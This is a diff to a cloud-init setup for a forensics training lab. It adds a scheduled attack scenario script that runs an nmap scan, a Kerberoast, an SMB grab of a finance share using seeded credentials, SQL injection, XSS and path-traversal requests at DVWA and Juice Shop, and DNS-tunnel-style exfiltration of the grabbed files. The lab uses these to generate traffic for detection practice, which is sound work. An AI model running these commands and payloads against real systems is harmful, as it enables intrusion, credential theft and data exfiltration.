@@ -61,6 +61,113 @@ write_files:
           break
       else:
           sys.exit(f"no service ticket for {spn} in the cache")
+  - path: /usr/local/lib/lab-attack/scenario.sh
+    permissions: '0o755'   # explicit octal: Multipass turns '0755' into the integer 493, which fails cloud-init's schema
+    content: |
+      #!/bin/bash
+      # Forensics lab: the scheduled attack scenario (lab-attack.timer, every 30 minutes), so there is
+      # always something to find in Arkime and Zeek. It only chains tools this box already has, with
+      # the lab's seeded accounts: a port scan, a Kerberoast (lab-kerberoast), an SMB grab from fs01,
+      # web requests at DVWA and Juice Shop, and the grabbed data sent out hex-encoded in DNS lookups
+      # (DNS-tunnel style, to names under the lab's own zone, so nothing leaves the lab).
+      # The deploy writes /etc/lab-attack/config ("<key> <value>" lines; parsed, never executed).
+      # Every command runs with a timeout and no stdin. What it did: /var/log/lab-attack.log.
+      set -uo pipefail
+      CONF=/etc/lab-attack/config
+      LOG=/var/log/lab-attack.log
+      WORK=/var/lib/lab-attack
+      log() { printf '%s %s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$*" >> "${LOG}"; }
+      attack() {   # attack <seconds> <what> <command...>: one step, logged, with a timeout and no stdin
+          local secs="$1" what="$2" rc=0
+          shift 2
+          log "${what}"
+          timeout "$secs" "$@" < /dev/null >> "${LOG}" 2>&1 || rc=$?
+          log "${what}: exit ${rc}"
+      }
+      run_quiet() {   # run_quiet <seconds> <command...>: like attack, output discarded (the dig/curl loops)
+          local secs="$1"
+          shift
+          timeout "$secs" "$@" < /dev/null > /dev/null 2>&1 || true
+      }
+
+      if [ ! -r "${CONF}" ]; then
+          log "no ${CONF} yet (the deploy writes it once every VM is up): nothing to do"
+          exit 0
+      fi
+      declare -A CFG=() TARGET=()
+      while read -r key value; do
+          case "${key}" in
+              target) TARGET["${value%% *}"]="${value#* }" ;;
+              ''|'#'*) ;;
+              *) CFG["${key}"]="${value}" ;;
+          esac
+      done < "${CONF}"
+      REALM="${CFG[realm]:-}"
+      REALM_LC="${REALM,,}"
+      NETBIOS="${CFG[netbios]:-}"
+      DC_IP="${TARGET[dc01]:-}"
+      FS01_IP="${TARGET[fs01]:-}"
+      WEB_IP="${TARGET[vulntarget]:-}"
+      mkdir -p "${WORK}/loot"
+      chmod 700 "${WORK}"
+      log "=== scenario start: ${#TARGET[@]} targets ==="
+
+      # 1. Reconnaissance: a SYN scan of the lab's VMs (never the Mac or anything outside the lab).
+      if [ "${#TARGET[@]}" -gt 0 ]; then
+          attack 900 "port scan of ${TARGET[*]}" nmap -sS -T4 --top-ports 100 -oN "${WORK}/scan.txt" "${TARGET[@]}"
+      fi
+
+      # 2. Kerberoast svc_sql with a seeded user's password (hash for hashcat -m 13100).
+      if [ -n "${DC_IP}" ] && [ -n "${CFG[user]:-}" ]; then
+          attack 120 "kerberoast MSSQLSvc/fs01.${REALM_LC}:1433 as ${CFG[user]}" \
+              /usr/local/bin/lab-kerberoast "${CFG[user]}" "${CFG[password]}" "MSSQLSvc/fs01.${REALM_LC}:1433" svc_sql
+      fi
+
+      # 3. SMB grab: everything on fs01's finance share, with a finance user's seeded password.
+      if [ -n "${FS01_IP}" ] && [ -n "${CFG[finance_user]:-}" ]; then
+          auth=$(mktemp)
+          printf 'username = %s\npassword = %s\ndomain = %s\n' "${CFG[finance_user]}" "${CFG[password]}" "${NETBIOS}" > "${auth}"
+          attack 300 "SMB grab //fs01/finance as ${NETBIOS}\\${CFG[finance_user]}" \
+              smbclient "//fs01/finance" -I "${FS01_IP}" -A "${auth}" -m SMB3 \
+              -c "prompt OFF; recurse ON; lcd ${WORK}/loot; mget *"
+          rm -f "${auth}"
+      fi
+
+      # 4. Web attack: well-known DVWA and Juice Shop exercise requests (SQL injection, XSS, file
+      #    listing, admin pages), sent with curl.
+      if [ -n "${WEB_IP}" ]; then
+          log "web requests at DVWA and Juice Shop on ${WEB_IP}"
+          for path in "/robots.txt" "/.git/HEAD" "/phpinfo.php" "/config/" "/setup.php" \
+                      "/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit" \
+                      "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E" \
+                      "/vulnerabilities/fi/?page=../../../../etc/passwd"; do
+              run_quiet 20 curl -s -m 15 -o /dev/null "http://${WEB_IP}${path}"
+          done
+          for path in "/ftp/" "/api/Users" "/rest/products/search?q=%27))--" "/rest/admin/application-configuration"; do
+              run_quiet 20 curl -s -m 15 -o /dev/null "http://${WEB_IP}:3000${path}"
+          done
+          run_quiet 20 curl -s -m 15 -o /dev/null -H 'Content-Type: application/json' \
+              -d '{"email":"'"'"' OR 1=1--","password":"x"}' "http://${WEB_IP}:3000/rest/user/login"
+      fi
+
+      # 5. DNS-tunnel-style exfil: the loot (or the scan when the share was empty), hex-encoded in
+      #    30-character labels, one lookup each, at most 200 per run. dc01 answers NXDOMAIN.
+      if [ -n "${DC_IP}" ]; then
+          src=$(find "${WORK}/loot" -type f | head -n 1)
+          [ -n "${src}" ] || src="${WORK}/scan.txt"
+          if [ -f "${src}" ]; then
+              session=$(od -An -N4 -tx1 /dev/urandom | tr -d ' \n')
+              log "DNS exfil of ${src} as <hex>.<n>.${session}.x.${REALM_LC} via ${DC_IP}"
+              n=0
+              while read -r chunk && [ "${n}" -lt 200 ]; do
+                  run_quiet 10 dig +short +time=2 +tries=1 "@${DC_IP}" "${chunk}.${n}.${session}.x.${REALM_LC}" TXT
+                  n=$((n + 1))
+              done < <(head -c 3000 "${src}" | od -An -v -tx1 | tr -d ' \n' | fold -w 30)
+              log "DNS exfil: ${n} lookups"
+          fi
+      fi
+      rm -rf "${WORK}/loot"
+      log "=== scenario done ==="
   - path: /root/provision.sh
     permissions: '0o755'   # explicit octal: Multipass turns '0755' into the integer 493, which fails cloud-init's schema
     content: |
@@ -76,6 +183,7 @@ write_files:
       DC_IP="__DC_IP__"
       DOMAIN_REALM="__DOMAIN_REALM__"
       KALI_TOOLS="__KALI_TOOLS__"   # 1 in the pentest lab: deploy-soc-lab.sh sets it from the lab
+      ATTACK_SCENARIO="__ATTACK_SCENARIO__"   # 1 in the forensics lab: the scheduled attack scenario
 
       hostnamectl set-hostname redteam
 
@@ -144,7 +252,7 @@ write_files:
       for bin in "sliver-server af9770ba37446b94cc2d535f274e09e7b84b6689a535f8a92c80a441f7ec04be" \
                  "sliver-client 5f0fa2074b7690eadea90ccc7d43d33b21bf1f9fea265624eea481fd7ddcb5e7"; do
           read -r name sha <<< "${bin}"
-          curl -fsSL -o "/usr/local/bin/${name}" \
+          curl -fsSL --retry 5 --retry-delay 20 -o "/usr/local/bin/${name}" \
               "https://github.com/BishopFox/sliver/releases/download/${SLIVER_VERSION}/${name}_linux-arm64"
           echo "${sha}  /usr/local/bin/${name}" | sha256sum -c -
           chmod 755 "/usr/local/bin/${name}"
@@ -238,6 +346,40 @@ write_files:
 
           echo "Kali tools: msfconsole, burpsuite (GUI), sqlmap, hydra, john, gobuster,"
           echo "ffuf, nikto, dirb, sudo responder, enum4linux-ng; wordlists in /usr/share/seclists."
+      fi
+
+      # Forensics lab: the scheduled attack scenario (scenario.sh above), every 30 minutes. It waits
+      # for /etc/lab-attack/config, which the deploy writes once every VM is up.
+      if [ "${ATTACK_SCENARIO}" = "1" ]; then
+          lab_step "Installing the scheduled attack scenario"
+          apt-get install -y bind9-dnsutils
+          install -m 755 /usr/local/lib/lab-attack/scenario.sh /usr/local/sbin/lab-attack-scenario
+          cat > /etc/systemd/system/lab-attack.service <<'EOF'
+      [Unit]
+      Description=Forensics lab: one run of the attack scenario
+      After=network-online.target
+
+      [Service]
+      Type=oneshot
+      ExecStart=/usr/local/sbin/lab-attack-scenario
+      TimeoutStartSec=40min
+      EOF
+          cat > /etc/systemd/system/lab-attack.timer <<'EOF'
+      [Unit]
+      Description=Forensics lab: the attack scenario every 30 minutes
+
+      [Timer]
+      OnBootSec=30min
+      OnUnitActiveSec=30min
+      RandomizedDelaySec=3min
+
+      [Install]
+      WantedBy=timers.target
+      EOF
+          systemctl daemon-reload
+          systemctl enable --now lab-attack.timer
+      else
+          rm -rf /usr/local/lib/lab-attack
       fi
 
       # Put the tools on every shell's PATH (not only login shells), with
